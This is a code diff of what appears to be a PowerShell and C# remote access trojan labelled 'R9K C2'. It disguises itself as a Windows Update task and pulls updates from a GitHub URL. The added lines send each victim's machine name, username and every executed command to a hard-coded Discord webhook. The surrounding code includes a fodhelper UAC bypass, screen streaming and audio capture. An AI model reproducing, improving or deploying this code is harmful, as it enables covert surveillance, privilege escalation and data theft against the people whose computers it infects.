@@ -13,11 +13,11 @@ $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# Função para Log no Discord
+# Função para Log no Discord (Corrigida sem crases)
 function Send-Webhook($msg) {
     try {
-        $text = "**[R9K C2]** " + $env:COMPUTERNAME + " (" + $env:USERNAME + ")`n" + $msg
-        $body = @{ content = $text } | ConvertTo-Json -Compress
+        $content = "[R9K C2] " + $env:COMPUTERNAME + " (" + $env:USERNAME + ") `n" + $msg
+        $body = @{ content = $content } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
@@ -297,7 +297,12 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.WriteLine(banner);
                     
                     // Log de Conexao
-                    try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K C2]** Nova conexao de `" + Environment.MachineName + "` (" + Environment.UserName + ")\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
+                    try { 
+                        System.Net.WebClient wc = new System.Net.WebClient(); 
+                        wc.Headers.Add("Content-Type", "application/json"); 
+                        string body = "{\"content\":\"**[R9K C2]** Nova conexao de `" + Environment.MachineName + "` (" + Environment.UserName + ")\"}"; 
+                        wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
+                    } catch {}
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -627,7 +632,12 @@ if (-not ("R9KAgent" -as [type])) {
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 // Log comando no Discord
-                try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
+                try { 
+                    System.Net.WebClient wc = new System.Net.WebClient(); 
+                    wc.Headers.Add("Content-Type", "application/json"); 
+                    string body = "{\"content\":\"**[R9K CMD]** `" + Environment.MachineName + "` executou: `" + cmd + "`\"}"; 
+                    wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
+                } catch {}
 
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
@@ -638,9 +648,7 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
 
-                // ==========================================
-                // UAC BYPASS METHODS
-                // ==========================================
+                // UAC BYPASS
                 if (cmd == "uac_fodhelper") {
                     try {
                         Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
@@ -710,7 +718,6 @@ if (-not ("R9KAgent" -as [type])) {
                     } catch { lock(writeLock) { myWriter.WriteLine("UAC_DEESC_ERR"); } }
                     return;
                 }
-                // ==========================================
 
                 if (cmd == "monitor_next") {
                     int n = Screen.AllScreens.Length;
